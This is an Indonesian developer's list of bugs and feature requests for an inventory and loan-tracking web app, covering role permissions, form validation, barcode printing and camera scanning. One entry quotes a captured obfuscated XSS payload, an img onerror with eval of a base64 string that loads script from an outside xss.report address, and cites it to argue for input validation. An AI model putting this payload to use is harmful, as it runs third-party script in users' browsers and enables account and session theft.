Fitur maupun permasalahan yang perlu diperbaiki:
- setelah input barang baru di Master barang muncul notif " Barang <strong>Meja Lipat 120cmX60cmX40CM</strong> berhasil ditambahkan dengan SKU <code>FURN-002</code>. " seharusnya tag html tidak dimunculkan di notif success or failed (Fixed)

- setelah menambahkan data instansi baru menampilkan halaman error yang berisi Symfony\Component\ErrorHandler\Error\FatalError
app\Http\Requests\StoreBorrowerRequest.php:10
Cannot declare class App\Http\Controllers\BorrowerController, because the name is already in use (Fixed)

- Filter periode di fitur Laporan Rekaptulasi Bulanan sebaiknya dibuat option calender sehingga user dapat memilih bulan maupun tahun dengan lebih mudah dengan tampilan kalender dan opsi tahun yang sudah mencakup masa depan atau beberapa tahun kedepan.(Fixed)

- Ketika ada barang total 5 dan dipinjam 3, saya mencoba mengubah data barang di master barang yaitu total nya menjadi 1 sehingga yang tersedia menampilkan 0, dan ketika barnag yang dipinjam sebanyak 3 dikembalikan, total fisik yang ditampilkan 1 dan yang tersedia 2 maka hal tersebut bisa menimbulkan kebingungan dan krusial pada data barang.(Fixed)

- di seeder maupun database ada tiga user superadmin, admin, dan staff yang dimana staff bisa melihat semua data yang ada di peminjaman. yang diinginkan adalah staff hanya bisa melihat data peminjaman yang dia buat sedangkan admin dapat melihat semua data beserta siapa yang menginputkan nya (Pencatat) dan sebaiknya superadmin ditambahkan fitur khusus yaitu management role agar bisa membedakan level role antara superadmin dan admin, admin punya semua fitur yang dimiliki superadmin kecuali management role(Fixed)

- Superadmin memiliki fitur management user, artinya hanya superadmin yang dapat menambahkan user baru sedangkan admin dan staff tidak bisa menambah user(Fixed)

- ketika ada seseorang mencoba masuk langsung ke /register dan /forget-password akan langsung diarahkan ke halaman /login sebagaimana mengakses /loans tanpa login(Fixed)

- ada form input "catatan" di fitur tambah data peminjaman, tapi form tersebut tidak memberikan nilai apapun di database (null) walaupun user mengisi form "catatan" (Fixed)

- ada kemungkinan user mengisi form tertentu dengan cross site scripting atau injeksi sql sehingga sangat krusial jika sampai merusak database atau fitur tertentu (Fixed)

- ada "Konfirmasi Password <span class="text-danger">*</span>" di atas form input konfirmasi password seharusnya tag <span> tidak ditampilkan di UI (Fixed)

- no. referensi di menu "Kartu Stok" memang bisa diganti jika auto-generate bermasalah namun terkadang user tidak akan memasukkan format yang benar dan bisa saja format nya salah, maka dari itu sebelum data mutasi baru masuk ke database, perlu pengecekan format data terlebih dahulu di bagian form input no. referensi dengan contoh: BAST/2026/09/001 dan jika ada user memasukkan no. referensi yang formatnya salah maka akan menimbulkan pesan error dan user tidak dapat menambahkan mutasi baru (Fixed)

- Nama barang maupun nama instansi terkadang bisa dimasukkan beberapa karakter aneh sehingga menampilkan nama dengan karakter yang bercampuran dan tidak sesuai dengan apa yang seharusnya contoh ada nama instansi "%22%3E%3Cimg%20src=x%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FuYW1hbmpheXNsZWJldyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;%20onerror=evalatob(this.id)%3E211222233334324csscsccnjsnjwnjnjenjnennn" sehingga perlu di validasi sebelum masuk di database (Process)

- Pada bagian fitur cetak label seharusnya di buat option dengan pilihan cetak barcode garis (1D) dengan menggunakan library `milon/barcode` dan Barcode Code Kotak (2D) dengan menggunakan library `simplesoftwareio/simple-qrcode` daripada langsung cetak label dengan menunjukkan file pdf berisi tulisan "Barcode FURN-001 FURN-001Kursi LipatChitose QR FURN-001" dan tidak menunjukkan barcode apapun

- Pada saat memasuki halaman tertentu yang mempunyai fitur listener scan, tidak ada indikasi yang menunjukkan bahwa apakah sedang menggunakan kamera, input device seperti scanner atau apapun. Seharusnya jika memang tidak ada input device scanner maka gunakan kamera webcam atau kamera belakang handphone dengan menambahkan satu option baru yaitu memilih device scanner yang akan digunakan yang berisi device scanner atau kamera yang terdeteksi oleh web, sehingga user bisa memilih device yang akan digunakan dari option tersebut

- Jika user menggunakan opsi kamera seperti webcam atau kamera belakang handphone, tampilkan sebuah preview agar menunjukkan bahwa kamera memang terdeteksi dan menunggu barcode yang akan di scan alasannya agar user bisa tahu bahwa scan barcode dengan kamera terdeteksi dan berjalan dengan baik

- Ketika mencoba semua fitur cetak label, muncul error "Picqer\Barcode\Exceptions\BarcodeException
vendor\picqer\php-barcode-generator\src\Renderers\PngRenderer.php:32
Neither the GD library nor the Imagick extension is installed!"

- Option Input untuk barang maupun kategori barang perlu ditambahkan fitur search, fungsinya untuk antisipasi jika data yang digunakan untuk option terlalu banyak dan membutuhkan waktu untuk melakukan pencarian secara manual, maka dengan adanya tambahan search bar di semua option input akan memudahkan proses pemilihan opsi yang ingin di cari